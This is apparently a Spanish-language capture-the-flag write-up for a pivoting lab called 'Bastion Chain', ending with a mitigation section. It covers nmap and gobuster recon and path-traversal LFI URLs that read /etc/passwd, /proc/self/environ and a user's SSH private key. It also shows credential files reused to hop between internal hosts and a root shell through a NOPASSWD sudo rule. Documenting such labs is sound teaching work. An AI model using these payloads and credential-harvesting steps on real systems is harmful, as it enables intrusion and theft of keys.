<h1 align="center">[Writeup] Bastion Chain - Reporte de Vulnerabilidad</h1>

**Dificultad:** Insano (★★★★★)

**Categoría:** Web / Descubrimiento de Credenciales /Saltos de Hosts/ Escalada de Privilegios

**Autor:** SBZTNGNR

**Fecha**: 25-09-2026

**Plataforma**: WhoAmI-Labs.com

---

![01](images/01.png)

---

# Descripción
Laboratorio avanzado de Pivoting y Movimiento Lateral. Diseñado para auditar vectores de salto entre redes internas y túneles comprometidos.

---
# 1. Reconocimiento
## 1.1. Escaneo Nmap:

Se realiza el reconocimiento inicial mediante nmap a la dirección IP **10.10.2.10**:
```bash
nmap -sV -sC --min-rate 5000 10.10.2.10 -oN scan_bastion_chain.txt
```
![02](images/02.png)
*Puertos descubiertos: 22 (SSH) y 80 (HTTP)*

## 1.2. Inspección Web:
La inspección web nos entrega pistas valiosas además de un par de archivos de texto (**welcome.txt y status.txt**), además de un **LFI** para inspeccionar archivos internos (Como dice la misma página:
![03](images/03.png)

Mientras corremos gobuster en caso de haber más archivos independiente de los que dice la página web:
```bash
gobuster dir -u http://10.10.2.10/ -w /usr/share/wordlists/dirb/common.txt -x html,php,txt,baj,old,js,json,sh
```

Independientemente de la lista usada, todas dieron los mismos resultados:
![04](images/04.png)

Así que se decidió probar el LFI expuesto:
```php
http://10.10.2.10/index.php?page=../../../etc/passwd
http://10.10.2.10/index.php?page=../../../etc/hosts
http://10.10.2.10/index.php?page=../../../proc/self/status
http://10.10.2.10/index.php?page=../../../proc/self/cmdline
http://10.10.2.10/index.php?page=../../../proc/self/environ
http://10.10.2.10/index.php?page=../../../var/www/html/index.php
```

Dando la mayoria postivio, pero el más importante ya nos daba un usuario con el cual arrancar
(**webops**):
![05](images/05.png)

PD: El uso de fuerza bruta en este caso fue en vano, ya que al final se termino revisando la carpeta **/home** de **webops** para obtener el acceso inicial:

```bash
curl -s http://10.10.2.10/index.php?page=../../../home/webops/.ssh/id_rsa
```

![06](images/06.png)

Ya solo era cuestion de volcarlo a un archivo local:
```bash
curl -s 'http://10.10.2.10/index.php?page=../../../home/webops/.ssh/id_rsa' -o id_rsa
```
Comprobamos el archivo:
```bash
>head -n 1 id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----

-----------------------------------

>tail -n 1 id_rsa 

-----END OPENSSH PRIVATE KEY-----
```
y le damos permisos:
```bash
chmod 600 id_rsa
```

# 2. Acceso Inicial Como webops:

Intentamos accede, para probar si la llave es funcional para este usuario:
```bash
ssh -i id_rsa webops@10.10.2.10
```
Y efectivamente, accesamos al sistema:
![07](images/07.png)

### -Aclaración:

```
Ya que la finalidad del laboratorio no es obtener acceso `root` en cada máquina, sino ir escalando privilegios y realizando saltos entre los distintos hosts hasta llegar al objetivo final y obtener la flag. Decidimos no perder el tiempo en intentar lograr acceso de root y simplemente seguir adelante con el desafío (Obtener la flag)
```

## 2.1. Examinando "www":

Una vez dentro de www, revisamos /etc/hosts para identificar posibles hosts dentro de la red interna. Allí encontramos bastion asociado a 10.10.2.20. Posteriormente, el archivo .inventory contenía las credenciales del usuario jump, permitiéndonos realizar el siguiente salto.
![08](images/08.png)

.inventory:
```bash
webops@www:~$ cat .inventory 
bastion=bastion
user=jump
pass=J0mp_B4st10n_2026!Ch4in
```

/etc/hosts:
```bash
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.1.10      www
10.10.2.10      www
10.10.2.20 bastion
```
## 2.2. Saltando al siguiente host (bastion):
Con las credenciales obtenidas:
```text
jump:J0mp_B4st10n_2026!Ch4in
```

Saltamos al siguiente host:
```
ssh jump@10.10.2.20
```
![09](images/09.png)

## 2.3. Saltando al siguiente host (secure):
Aquí solo repetimos los pasos anteriores. 
.next:
```bash
secure=secure
user=auditor
pass=Aud1t0r_S3cur3_L4t!
```

/etc/hosts:
```bash
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.2.20      bastion
10.10.3.30 secure
10.10.3.20      bastion
```

Credenciales:
```text
auditor:Aud1t0r_S3cur3_L4t!
```

Saltamos al siguiente host:
```ssh
ssh auditor@10.10.3.30
```
![10](images/10.png)

# 3. Acceso a root:

Llegados a este punto, revisamos la carpeta **/home** de **auditor**, sin muchas novedades, al revisar **/etc/hosts**:
```bash
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.3.30      secure
```

Esto nos da la pista de que **secure** es el último host de la cadena y, por lo tanto, el objetivo que debemos comprometer. Para comprobar qué privilegios tiene el usuario auditor, ejecutamos **sudo -l**, obteniendo:
```bash
Matching Defaults entries for auditor on secure:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User auditor may run the following commands on secure:
   (ALL) NOPASSWD: ALL
```

Esto indica que **auditor** puede ejecutar cualquier comando con privilegios de cualquier usuario, incluido **root**, sin necesidad de introducir una contraseña.

Para obtener una shell como root, ejecutamos:
```bash
sudo -i
```

Finalmente, comprobamos los privilegios obtenidos:
```bash
auditor@secure:~$ sudo -i
root@secure:~# whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
root@secure:~# 
```

# 4. Obtención de Flag:

Por ultimo, nos dirijimos al directorio raíz para obtener la flag:
![11](images/11.png)

```
PivotLabs{b4st10n_ch41n_c0mpl3t3}
```
![12](images/12.png)


---

# 5. Mitigaciones

### 5.1. Corregir la vulnerabilidad LFI

El parámetro `page` permite leer archivos arbitrarios del sistema mediante técnicas de _Path Traversal_. Se debe evitar utilizar directamente la entrada proporcionada por el usuario en funciones como `readfile()`.

Como medida principal, se recomienda utilizar una **lista blanca de archivos permitidos**, en lugar de aceptar rutas arbitrarias. También se deben validar y normalizar las rutas antes de utilizarlas y restringir el acceso únicamente al directorio destinado a los documentos.

### 5.2. Evitar la exposición de credenciales

Durante la explotación se encontraron credenciales almacenadas en archivos dentro de los directorios personales de los usuarios, como `.inventory` y `.next`. Estos archivos permitieron obtener directamente las credenciales necesarias para realizar los siguientes saltos.

Las credenciales no deberían almacenarse en archivos accesibles por usuarios que no las necesitan. Cuando sea necesario utilizar secretos, se recomienda emplear un gestor de secretos o mecanismos seguros de almacenamiento, además de aplicar permisos restrictivos sobre los archivos.

También se recomienda **no reutilizar credenciales entre servicios o hosts** y rotar inmediatamente cualquier credencial que haya sido expuesta.

### 5.3. Aplicar el principio de mínimo privilegio

El usuario `auditor` disponía de:

```text
(ALL) NOPASSWD: ALL
```

Esto permitía ejecutar cualquier comando como `root` sin autenticación adicional.

La configuración de `sudo` debería limitarse exclusivamente a los comandos que el usuario necesita para realizar su función. Evitar reglas globales como `NOPASSWD: ALL` reduce considerablemente el impacto de una cuenta comprometida.
